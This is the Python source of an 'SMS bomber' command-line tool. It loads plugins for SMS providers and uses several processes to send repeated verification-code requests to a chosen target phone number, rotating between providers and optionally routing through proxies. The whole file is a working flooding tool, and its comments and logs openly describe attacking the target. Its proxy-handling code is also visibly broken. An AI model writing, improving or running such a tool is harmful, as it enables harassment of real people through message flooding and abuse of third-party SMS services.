# coding=utf-8

import argparse
import importlib
import json
import logging
import multiprocessing
import pkgutil
import platform
import random
import sys
import time
import uuid

import coloredlogs
import requests

import plugins

__version__ = '0.0.1'
__author__ = 'iamshellvon@gmail.com'


def setup_logger(name, use_colors=True, verbose_count=0):
    """
    初始化日志~
    :param name: 日志名
    :type name: str
    :param use_colors:
    :type use_colors: bool
    :param verbose_count:
    :type verbose_count: int
    :return:
    """
    fmt = '[%(levelname).8s %(asctime)s %(module)s:%(lineno)d] %(message)s'
    datefmt = '%Y-%m-%d %H:%M:%S'
    level = max(3 - verbose_count, 0) * 10
    logger = logging.getLogger(name)
    if use_colors:
        coloredlogs.install(logger=logger, level=level, fmt=fmt, datefmt=datefmt)
    else:
        logging.basicConfig(level=level, format=fmt, datefmt=datefmt)
    logging.getLogger('requests').setLevel(level)
    return logging.getLogger(name)


def load_plugins(namespace):
    """
    :param namespace:
    :type namespace: Any
    :return:
    """
    return {
        name: importlib.import_module(name)
        for finder, name, ispkg
        in pkgutil.iter_modules(namespace.__path__, namespace.__name__ + '.')
    }


class LoggerMixin(object):
    """https://stackoverflow.com/questions/3375443/cant-pickle-loggers"""

    @property
    def logger(self):
        component = "{}.{}".format(type(self).__module__, type(self).__name__)
        return logging.getLogger(component)


class SmsPlugin(LoggerMixin):
    """短信插件"""
    API_URLS = {
        'send': 'https://von.sh'
    }

    def __init__(self, **kwargs):
        self.auth = kwargs.get('auth', {})
        self.method = kwargs.get('method', 'GET')
        self.api = kwargs.get('api', self.API_URLS['send'])
        self.desc = kwargs.get('desc')
        self.payloads = kwargs.get('payloads', {})
        self.enable_custom_msg = kwargs.get('enable_custom_msg', False)
        self._req = requests.session()
        if platform.system() == 'Darwin':  # WTF!
            # 在 Kivy 里面新开线程的时候会发现requests卡在检查代理设置的地方
            # 我也不知道具体原因是什么,只好暂时关闭这个配置
            # https://stackoverflow.com/a/39822223
            self._req.trust_env = False
        self._req.headers['User-Agent'] = 'SmsBomb %s' % __version__
        self._req.proxies.update(kwargs.get('proxies') or {})

    def __repr__(self):
        return '<{}:{}>'.format(self.__class__.__name__, self.auth)

    def __str__(self):
        return self.__repr__()

    @property
    def nonce(self):
        return uuid.uuid4().hex

    @property
    def curtime(self):
        return str(int(time.time()))

    def get_msg_content(self, config, key='msg'):
        msg = config.get(key, '您的验证码是: 123456')
        if self.enable_custom_msg:
            return config.get('__custom_msg', msg)
        return msg

    def send(self, mobile, **kwargs):
        self.payloads['mobile'] = mobile
        resp = self._req.request(self.method, self.api, data=self.payloads)
        self.logger.info(resp)
        return resp


def worker(*args, **kwargs):
    """
    多进程需要跑的worker.

    :param args:
    :param kwargs:
    :return:
    """
    obj, method_name = args[:2]
    logging.debug(
        '{obj}->{method_name}({args},{kwargs})'.format(obj=type(obj).__name__,
                                                       method_name=method_name,
                                                       args=args[2:],
                                                       kwargs=kwargs))
    return getattr(obj, method_name)(*args[2:], **kwargs)


class SmsBomb(LoggerMixin):
    """短信轰炸机"""

    def __init__(self, plugins, config_lst, target, **kwargs):
        """
        短信轰炸机!!!!
        :param plugins: 插件
        :param config_lst: 配置列表
        :param target: 攻击手机号
        :param kwargs: 其他自定义信息,比如msg/proccess_num/prefix
        """
        self.plugins = plugins
        self.config_lst = config_lst
        self.target = target
        self.limit = kwargs.get('limit', 10)
        self.process_num = kwargs.get('process_num', 5)
        self.custom_msg = kwargs.get('msg', None)
        self.prefix = kwargs.get('prefix', '')
        self.proxies = kwargs.get('proxy', {})
        self.max_allowed_failed_rate = 0.95  # 最大允许的失败率.超过这个失败率之后会宣告失败
        self.failed_config_lst = []

    def _random_weight_select(self):
        weight_lst = [[k, v.copy()] for (k, v) in enumerate(self.config_lst) for _ in range(v.get('weight', 1))]
        if weight_lst:
            return random.choice(weight_lst)
        return None

    def re_config(self, config_lst):
        self.config_lst = config_lst
        self.failed_config_lst = []

    def progress_info(self, success_cnt, failed_cnt, limit, force_finished=False):
        failed_rate = failed_cnt / limit
        self.logger.debug('攻击进度(成功数/期望攻击次数): %d/%d = %.2f%%, 实际攻击目标次数(含失败): %d(失败%d次, 失败率: %.2f%%)',
                          success_cnt, limit, success_cnt * 100 / limit,
                          success_cnt + failed_cnt, failed_cnt, failed_rate * 100)
        if success_cnt == limit or force_finished:
            self.logger.info(
                '攻击完毕,成功: {0}次, 失败: {1}次'.format(
                    success_cnt, failed_cnt))

    def start(self, config_lst=None, cb=None):
        """
        :param config_lst: 配置列表
        :param cb: 进度回调函数,接受四个参数:成功数/失败数/总数/是否已经结束？
        :return:
        """
        if config_lst:
            self.re_config(config_lst)
        pool = multiprocessing.Pool(processes=self.process_num)
        success_cnt = 0
        failed_cnt = 0
        failed_rate = 0
        cb = cb if cb else self.progress_info

        self.logger.info('Start attacking phone: %s', self.target)
        while success_cnt < self.limit and failed_rate <= self.max_allowed_failed_rate:
            failed_rate = failed_cnt / self.limit
            index, current_config = self._random_weight_select()
            if not current_config:
                # 如果已经找不到配置了, 尝试把之前错误的配置重新分配,并标记失败次数
                self.logger.warning('没有可用配置可供使用!尝试重置配置列表:%s', self.failed_config_lst)
                self.re_config(self.failed_config_lst)
                failed_cnt += 1
                continue
            key = self.prefix + current_config['product']
            cls = current_config.get('product').title() + 'Plugin'
            obj = self.plugins.get(key)
            if not obj or not hasattr(obj, cls):
                self.logger.warning('无此插件:%s,跳过' % cls)
                continue
            cls = getattr(obj, cls)(proxies=self.proxies, **current_config)
            payloads = current_config.get('payloads', {})
            if self.custom_msg:
                payloads['__custom_msg'] = self.custom_msg
            success = pool.apply(worker, args=(
                cls, 'send', self.target), kwds=payloads)
            if success:
                success_cnt += 1
            else:
                self.logger.warning('节点%s请求失败,尝试降低此配置的优先级,并标记此节点已经失败', current_config)
                # 失败,尝试降低修改此配置的优先级,并标记此节点已经失败.
                self.config_lst[index]['weight'] = max(current_config.get('weight', 1) - 1, 0)
                current_config['weight'] = 1
                self.failed_config_lst.append(current_config)
                failed_cnt += 1
            cb(success_cnt, failed_cnt, self.limit)
        cb(success_cnt, failed_cnt, self.limit, force_finished=True)


def load_config(cfg, product=None):
    """
    加载配置

    :param cfg: 配置文件完整目录
    :type  cfg: str
    :param product: 如果指定了产品则只返回该产品配置否则返回所有配置
    :type  product: str
    :return:
    """
    with open(cfg, 'r', encoding='utf8') as config_file:
        config = json.loads(config_file.read())
    if product:
        return list(filter(lambda x: x['product'] == product, config))
    return config


def parse_command_line(sms_services):
    """
    :param sms_services: 支持短信产品列表
    :type  sms_services: list
    :return:
    """
    parser = argparse.ArgumentParser(description='短信轰炸机', epilog="See https://von.sh/smsBomb")
    parser.add_argument('-t', '--target', type=int,
                        required=True, help='指定攻击目标手机号')
    parser.add_argument('-n', '--times', type=int,
                        default=10, help='指定攻击次数,默认10')
    parser.add_argument('-p', '--product',
                        choices=sms_services,
                        type=str,
                        default=None,
                        help='使用指定产品攻击,比如网易netease/云之讯/创蓝253/腾讯云/阿里云')
    parser.add_argument('-c', '--config', type=str,
                        default='config/sms.json', help='指定配置文件')
    parser.add_argument('--process', dest='process_num',
                        type=int, default=5, help='进程数,默认5')
    parser.add_argument('-m', '--message', type=str, help='自定义的消息体,如果支持的话')
    parser.add_argument('-v', '-verbose', dest="verbose_count",
                        action="count", default=0, help='日志级别,-v,-vv,-vvv')

    parser.add_argument('-x', '--proxy',
                        type=str,
                        default='',
                        help="设置发起请求时的代理http/https,如果没设置将自动尝试环境变量 HTTP_PROXY 和 HTTPS_PROXY")

    return parser.parse_args()


def main():
    # 插件前缀.
    plugin_prefix = plugins.__name__ + '.'
    # 加载目前已经有的所有短信插件.
    sms_plugins = load_plugins(plugins)
    # 支持的短信服务商.
    supported_sms_service = [name.replace(
        plugin_prefix, '') for name in sms_plugins.keys()]

    args = parse_command_line(supported_sms_service)

    logger = setup_logger(__name__,
                          use_colors=sys.stdout.isatty(),
                          verbose_count=args.verbose_count)
    config = load_config(args.config, args.product)
    logger.debug('成功加载配置文件:%s,产品:%s', args.config, args.product)
    args.process_num = min(args.process_num, args.times)

    if not config:
        logger.error('短信轰炸机配置不可为空')
        return

    proxy_str = args.proxy
    proxies = None
    if proxy_str.lower().startswith('http://'):
        proxies['http'] = proxy_str
    elif proxy_str.lower().startswith('https://'):
        proxies['https'] = proxy_str
    elif proxy_str:
        proxies['http'] = proxy_str['https'] = proxy_str

    sms_bomb = SmsBomb(sms_plugins, config, args.target,
                       process_num=args.process_num,
                       msg=args.message,
                       limit=args.times,
                       prefix=plugin_prefix,
                       proxies=proxies
                       )
    sms_bomb.start()


if __name__ == '__main__':
    main()
